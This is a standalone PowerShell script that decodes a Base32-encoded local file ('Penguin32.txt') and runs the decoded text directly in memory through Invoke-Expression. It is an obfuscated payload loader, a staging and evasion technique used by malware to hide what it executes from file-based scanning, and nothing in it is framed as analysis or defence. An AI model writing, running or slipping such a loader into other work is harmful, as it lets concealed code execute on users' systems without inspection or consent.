# Base32 Decoding function
function Decode-Base32 {
    param(
        [Parameter(Mandatory=$true)]
        [string]$EncodedText
    )

    $encodedChars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567"
    $byteOutput = New-Object byte[]([math]::ceiling($EncodedText.Length * 5 / 8))
    $byteCount = 0
    $buffer = 0
    $bitsRemaining = 0

    foreach ($c in $EncodedText.ToUpper().ToCharArray()) {
        $value = [array]::IndexOf($EncodedChars.ToCharArray(), $c)
        if ($value -eq -1) {
            throw "Invalid Base32 character '$c'"
        }
        $buffer = ($buffer -shl 5) -bor $value
        $bitsRemaining += 5

        if ($bitsRemaining -ge 8) {
            $byteOutput[$byteCount++] = [byte]($buffer -shr ($bitsRemaining - 8))
            $bitsRemaining -= 8
            $buffer = $buffer -band ([math]::pow(2, $bitsRemaining) - 1)
        }
    }

    return ,$byteOutput[0..($byteCount - 1)]
}


# Specify Base32 encoded file path on the local machine
$targetFilePath = "C:\Users\PATH\Penguin32.txt"

# Decode and execute it on memory
try {
    $encodedData = Get-Content -Path $targetFilePath -Raw

    # Remove illegitimate charactors
    $encodedData = $encodedData -replace "[^A-Z2-7]", ""
    $decodedBytes = Decode-Base32 $encodedData

    $decodedScript = [System.Text.Encoding]::UTF8.GetString($decodedBytes)

    # execute the file on memory
    Invoke-Expression ([System.Text.Encoding]::UTF8.GetString($decodedBytes))
}
catch {
    Write-Host "Error when downloading or executing the file: $_"
}

